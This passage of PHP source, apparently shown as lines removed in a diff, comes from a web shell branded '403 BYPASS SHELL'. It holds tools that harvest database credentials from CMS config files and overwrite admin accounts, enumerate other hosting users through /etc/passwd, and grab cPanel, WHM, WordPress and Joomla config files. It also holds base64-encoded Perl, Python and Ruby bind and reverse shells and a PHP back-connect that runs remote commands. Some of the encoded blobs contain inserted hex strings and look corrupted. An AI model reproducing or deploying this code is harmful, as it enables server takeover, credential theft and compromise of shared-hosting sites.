-                    echo $url_target;
-                    if(!$update OR !$conn OR !$db) {
-                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
-                    } else {
-                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
-                    }
-                    mysql_close($conn);
-                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
-                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
-                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
-                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
-                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
-                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
-                    $prefix = $dbprefix."admin_user";
-                    $option = $dbprefix."core_config_data";
-                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
-                    $db = mysql_select_db($dbname);
-                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
-                    $result = mysql_fetch_array($q);
-                    $id = $result[user_id];
-                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
-                    $result2 = mysql_fetch_array($q2);
-                    $target = $result2[value];
-                    if($target == '') {
-                        $url_target = "Login => <font color=red>Error, can't get the domain name</font><br>";
-                    } else {
-                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
-                    }
-                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
-                    echo "Config => ".$file_conf."<br>";
-                    echo "CMS => Magento<br>";
-                    echo $url_target;
-                    if(!$update OR !$conn OR !$db) {
-                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
-                    } else {
-                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
-                    }
-                    mysql_close($conn);
-                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
-                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
-                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
-                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
-                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
-                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
-                    $prefix = $dbprefix."user";
-                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
-                    $db = mysql_select_db($dbname);
-                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
-                    $result = mysql_fetch_array($q);
-                    $id = $result[user_id];
-                    $target = ambilkata($config,"HTTP_SERVER', '","'");
-                    if($target == '') {
-                        $url_target = "Login => <font color=red>Error, can't get the domain name</font><br>";
-                    } else {
-                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
-                    }
-                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
-                    echo "Config => ".$file_conf."<br>";
-                    echo "CMS => OpenCart<br>";
-                    echo $url_target;
-                    if(!$update OR !$conn OR !$db) {
-                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
-                    } else {
-                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
-                    }
-                    mysql_close($conn);
-                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
-                    $dbhost = ambilkata($config,'server = "','"');
-                    $dbuser = ambilkata($config,'username = "','"');
-                    $dbpass = ambilkata($config,'password = "','"');
-                    $dbname = ambilkata($config,'database = "','"');
-                    $prefix = "users";
-                    $option = "identitas";
-                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
-                    $db = mysql_select_db($dbname);
-                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
-                    $result = mysql_fetch_array($q);
-                    $target = $result[alamat_website];
-                    if($target == '') {
-                        $target2 = $result[url];
-                        $url_target = "Login => <font color=red>Error, can't get the domain name</font><br>";
-                        if($target2 == '') {
-                            $url_target2 = "Login => <font color=red>Error, can't get the domain name</font><br>";
-                        } else {
-                            $cek_login3 = file_get_contents("$target2/adminweb/");
-                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
-                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
-                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
-                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
-                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
-                            } else {
-                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>I don't know where the admin login is :p</font> ]<br>";
-                            }
-                        }
-                    } else {
-                        $cek_login = file_get_contents("$target/adminweb/");
-                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
-                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
-                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
-                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
-                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
-                        } else {
-                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>I don't know where the admin login is :p</font> ]<br>";
-                        }
-                    }
-                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
-                    echo "Config => ".$file_conf."<br>";
-                    echo "CMS => Lokomedia<br>";
-                    if(preg_match('/Error, can t get the domain name/', $url_target)) {
-                        echo $url_target2;
-                    } else {
-                        echo $url_target;
-                    }
-                    if(!$update OR !$conn OR !$db) {
-                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
-                    } else {
-                        echo "Status => <font color=lime>Successfully edit user, please login with new user & pass.</font><br><br>";
-                    }
-                    mysql_close($conn);
-                }
-            }
-        }
-    } else {
-        echo "<center>
-        <h1>Auto Edit User Config</h1>
-        <form method='post'>
-        DIR Config: <br>
-        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
-        Set User & Pass: <br>
-        <input type='text' name='user_baru' value='403 BYPASS SHELL' placeholder='user_baru'><br>
-        <input type='text' name='pass_baru' value='403 BYPASS SHELL' placeholder='pass_baru'><br>
-        <input type='submit' name='hajar' value='SUBMIT' style='width: 215px;'>
-        </form>
-        <span>NOTE: This tool works if run in a folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
-        ";
-    }
-    } elseif ($_GET['web'] == 'jumping') {
-    $i = 0;
-    echo "<pre><div class='margin: 5px auto;'>";
-    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
-    while ($passwd = fgets($etc)) {
-        if ($passwd == '' || !$etc) {
-            echo "<font color=red>Can't read /etc/passwd</font>";
-        } else {
-            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
-            foreach ($user_jumping[1] as $user_con7ext_jump) {
-                $user_jumping_dir = "/home/$user_con7ext_jump/public_html";
-                if (is_readable($user_jumping_dir)) {
-                    $i++;
-                    $jrw = "[<font color=white>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
-                    if (is_writable($user_jumping_dir)) {
-                        $jrw = "[<font color=white>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
-                    }
-                    echo $jrw;
-                    if (function_exists('posix_getpwuid')) {
-                        $domain_jump = file_get_contents("/etc/named.conf");
-                        if ($domain_jump == '') {
-                            echo " => ( <font color=red>can't get the domain name</font> )<br>";
-                        } else {
-                            preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
-                            foreach ($domains_jump[1] as $dj) {
-                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
-                                $user_jumping_url = $user_jumping_url['name'];
-                                if ($user_jumping_url == $user_con7ext_jump) {
-                                    echo " => ( <u>$dj</u> )<br>";
-                                    break;
-                                }
-                            }
-                        }
-                    } else {
-                        echo "<br>";
-                    }
-                }
-            }
-        }
-    }
-    if ($i == 0) {
-    } else {
-        echo "<br>Total " . $i . " Dir" . gethostbyname($_SERVER['HTTP_HOST']) . "";
-    }
-    echo "</div></pre>";
-} elseif ($_GET['backconnect'] == 'tool') {
-    echo "<br><br><center><form method=post>
-<br>    <span>Bind port to /bin/sh [Perl]</span><br/>
-    Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='>>'>
-<br><br>
-        <span>Back-connect</span><br/>
-    Server: <input type='text' name='server' placeholder='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' placeholder='443'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>
-   <input type=submit value='>>'>";
-   if ($_POST['bpl']) {
-        $bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCx0x4d957169be41a75F466C49F955024E064499289029ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENP0x4d957169be41a75F466C49F955024E0644992890B7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09O0x4d957169be41a75F466C49F955024E0644992890sNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
-        $brt = @fopen('bp.pl', 'w');
-        fwrite($brt, $bp);
-        $out = exe("perl bp.pl " . $_POST['port'] . " 1>/dev/null 2>&1 &");
-        sleep(1);
-        echo "<pre>$out
-" . exe("ps aux | grep bp.pl") . "</pre>";
-        unlink("bp.pl");
-    }
-    if ($_POST['backconnect'] == 'perl') {
-        $bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVB0x4d957169be41a75F466C49F955024E0644992890AkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
-        $plbc = @fopen('bc.pl', 'w');
-        fwrite($plbc, $bc);
-        $out = exe("perl bc.pl " . $_POST['server'] . " " . $_POST['port'] . " 1>/dev/null 2>&1 &");
-        sleep(1);
-        echo "<pre>$out
-" . exe("ps aux | grep bc.pl") . "</pre>";
-        unlink("bc.pl");
-    }
-}
-if ($_POST['backconnect'] == 'python') {
-        $becaa = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
-        $pbcaa = @fopen('bcpyt.py', 'w');
-        fwrite($pbcaa, $becaa);
-        $out1 = exe("python bcpyt.py " . $_POST['server'] . " " . $_POST['port']);
-        sleep(1);
-        echo "<pre>$out1
-" . exe("ps aux | grep bcpyt.py") . "</pre>";
-        unlink("bcpyt.py");
-    }
-    if ($_POST['backconnect'] == 'ruby') {
-        $becaak = base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9ye0x4d957169be41a75F466C49F955024E0644992890uY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1B0x4d957169be41a75F466C49F955024E0644992890CkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
-        $pbcaak = @fopen('bcruby.rb', 'w');
-        fwrite($pbcaak, $becaak);
-        $out2 = exe("ruby bcruby.rb " . $_POST['server'] . " " . $_POST['port']);
-        sleep(1);
-        echo "<pre>$out2
-" . exe("ps aux | grep bcruby.rb") . "</pre>";
-        unlink("bcruby.rb");
-    }
-    if ($_POST['backconnect'] == 'php') {
-        $ip = $_POST['server'];
-        $port = $_POST['port'];
-        $sockfd = fsockopen($ip, $port, $errno, $errstr);
-        if ($errno != 0) {
-            echo "<font color='red'>$errno : $errstr</font>";
-        } else if (!$sockfd) {
-            $result = "<p>Unexpected error has occured, connection may have failed.</p>";
-        } else {
-            fputs($sockfd, "
-                
-{################################################################}
-                
-             ..:: BackConnect Php By 403 BYPASS SHELL ::..
-                
-{################################################################}
-");
-            $dir = shell_exec("pwd");
-            $sysinfo = shell_exec("uname -a");
-            $time = Shell_exec("time");
-            $len = 1337;
-            fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "
-
-");
-            while (!feof($sockfd)) {
-                $cmdPrompt = '[HCA]#:> ';
-                fputs($sockfd, $cmdPrompt);
-                $command = fgets($sockfd, $len);
-                fputs($sockfd, "
-" . shell_exec($command) . "
-
-");
-            }
-            fclose($sockfd);
-        }
-    }
-    elseif($_GET['do'] == 'config') {
-    if($_POST){
-        $passwd = $_POST['passwd'];
-        mkdir("403_config", 0777);
-        $isi_htc = "Options all\nRequire None\nSatisfy Any";
-        $htc = fopen("403_config/.htaccess","w");
-        fwrite($htc, $isi_htc);
-        preg_match_all('/(.*?):x:/', $passwd, $user_config);
-        foreach($user_config[1] as $user_chonx) {
-            $user_config_dir = "/home/$user_chonx/public_html/";
-            if(is_readable($user_config_dir)) {
-                $grab_config = array(
-                                        "/home/$user_chonx/.my.cnf" => "cpanel",
-                    "/home/$user_chonx/.accesshash" => "WHM-accesshash",
-                    "/home/$user_chonx/public_html/bw-configs/config.ini" => "BosWeb",
-                    "/home/$user_chonx/public_html/config/koneksi.php" => "Lokomedia",
-                    "/home/$user_chonx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
-                    "/home/$user_chonx/public_html/clientarea/configuration.php" => "WHMCS",                
-                    "/home/$user_chonx/public_html/whmcs/configuration.php" => "WHMCS",
-                    "/home/$user_chonx/public_html/forum/config.php" => "phpBB",
-                    "/home/$user_chonx/public_html/sites/default/settings.php" => "Drupal",
-                    "/home/$user_chonx/public_html/config/settings.inc.php" => "PrestaShop",
-                    "/home/$user_chonx/public_html/app/etc/local.xml" => "Magento",
-                    "/home/$user_chonx/public_html/admin/config.php" => "OpenCart",
-                    "/home/$user_chonx/public_html/slconfig.php" => "Sitelok",
-                    "/home/$user_chonx/public_html/application/config/database.php" => "Ellislab",                  
-                    "/home/$user_chonx/public_html/whm/configuration.php" => "WHMCS",
-                    "/home/$user_chonx/public_html/whmc/WHM/configuration.ph" => "WHMC",
-                    "/home/$user_chonx/public_html/central/configuration.php" => "WHM Central",
-                    "/home/$user_chonx/public_html/whm/WHMCS/configuration.php" => "WHMCS",
-                    "/home/$user_chonx/public_html/whm/whmcs/configuration.php" => "WHMCS",
-                    "/home/$user_chonx/public_html/submitticket.php" => "WHMCS",                                        
-                    "/home/$user_chonx/public_html/configuration.php" => "Joomla",                  
-                    "/home/$user_chonx/public_html/Joomla/configuration.php" => "JoomlaJoomla",
-                    "/home/$user_chonx/public_html/joomla/configuration.php" => "JoomlaJoomla",
-                    "/home/$user_chonx/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",     
-                    "/home/$user_chonx/public_html/Home/configuration.php" => "JoomlaHome",
-                    "/home/$user_chonx/public_html/HOME/configuration.php" => "JoomlaHome",
-                    "/home/$user_chonx/public_html/home/configuration.php" => "JoomlaHome",
-                    "/home/$user_chonx/public_html/NEW/configuration.php" => "JoomlaNew",
-                    "/home/$user_chonx/public_html/New/configuration.php" => "JoomlaNew",
-                    "/home/$user_chonx/public_html/new/configuration.php" => "JoomlaNew",
-                    "/home/$user_chonx/public_html/News/configuration.php" => "JoomlaNews",
-                    "/home/$user_chonx/public_html/NEWS/configuration.php" => "JoomlaNews",
-                    "/home/$user_chonx/public_html/news/configuration.php" => "JoomlaNews",
-                    "/home/$user_chonx/public_html/Cms/configuration.php" => "JoomlaCms",
-                    "/home/$user_chonx/public_html/CMS/configuration.php" => "JoomlaCms",
-                    "/home/$user_chonx/public_html/cms/configuration.php" => "JoomlaCms",
-                    "/home/$user_chonx/public_html/Main/configuration.php" => "JoomlaMain",
-                    "/home/$user_chonx/public_html/MAIN/configuration.php" => "JoomlaMain",
-                    "/home/$user_chonx/public_html/main/configuration.php" => "JoomlaMain",
-                    "/home/$user_chonx/public_html/Blog/configuration.php" => "JoomlaBlog",
-                    "/home/$user_chonx/public_html/BLOG/configuration.php" => "JoomlaBlog",
-                    "/home/$user_chonx/public_html/blog/configuration.php" => "JoomlaBlog",
-                    "/home/$user_chonx/public_html/Blogs/configuration.php" => "JoomlaBlogs",
-                    "/home/$user_chonx/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
-                    "/home/$user_chonx/public_html/blogs/configuration.php" => "JoomlaBlogs",
-                    "/home/$user_chonx/public_html/beta/configuration.php" => "JoomlaBeta",
-                    "/home/$user_chonx/public_html/Beta/configuration.php" => "JoomlaBeta",
-                    "/home/$user_chonx/public_html/BETA/configuration.php" => "JoomlaBeta",
-                    "/home/$user_chonx/public_html/PRESS/configuration.php" => "JoomlaPress",
-                    "/home/$user_chonx/public_html/Press/configuration.php" => "JoomlaPress",
-                    "/home/$user_chonx/public_html/press/configuration.php" => "JoomlaPress",
-                    "/home/$user_chonx/public_html/Wp/configuration.php" => "JoomlaWp",
-                    "/home/$user_chonx/public_html/wp/configuration.php" => "JoomlaWp",
-                    "/home/$user_chonx/public_html/WP/configuration.php" => "JoomlaWP",
-                    "/home/$user_chonx/public_html/portal/configuration.php" => "JoomlaPortal",
-                    "/home/$user_chonx/public_html/PORTAL/configuration.php" => "JoomlaPortal",
-                    "/home/$user_chonx/public_html/Portal/configuration.php" => "JoomlaPortal",                 
-                    "/home/$user_chonx/public_html/wp-config.php" => "WordPress",
-                    "/home/$user_chonx/public_html/wordpress/wp-config.php" => "WordPressWordpress",
-                    "/home/$user_chonx/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
-                    "/home/$user_chonx/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",        
-                    "/home/$user_chonx/public_html/Home/wp-config.php" => "WordPressHome",
-                    "/home/$user_chonx/public_html/HOME/wp-config.php" => "WordPressHome",
-                    "/home/$user_chonx/public_html/home/wp-config.php" => "WordPressHome",
-                    "/home/$user_chonx/public_html/NEW/wp-config.php" => "WordPressNew",
-                    "/home/$user_chonx/public_html/New/wp-config.php" => "WordPressNew",
-                    "/home/$user_chonx/public_html/new/wp-config.php" => "WordPressNew",
-                    "/home/$user_chonx/public_html/News/wp-config.php" => "WordPressNews",
-                    "/home/$user_chonx/public_html/NEWS/wp-config.php" => "WordPressNews",
-                    "/home/$user_chonx/public_html/news/wp-config.php" => "WordPressNews",
-                    "/home/$user_chonx/public_html/Cms/wp-config.php" => "WordPressCms",
-                    "/home/$user_chonx/public_html/CMS/wp-config.php" => "WordPressCms",
-                    "/home/$user_chonx/public_html/cms/wp-config.php" => "WordPressCms",
-                    "/home/$user_chonx/public_html/Main/wp-config.php" => "WordPressMain",
-                    "/home/$user_chonx/public_html/MAIN/wp-config.php" => "WordPressMain",
-                    "/home/$user_chonx/public_html/main/wp-config.php" => "WordPressMain",
-                    "/home/$user_chonx/public_html/Blog/wp-config.php" => "WordPressBlog",
-                    "/home/$user_chonx/public_html/BLOG/wp-config.php" => "WordPressBlog",
-                    "/home/$user_chonx/public_html/blog/wp-config.php" => "WordPressBlog",
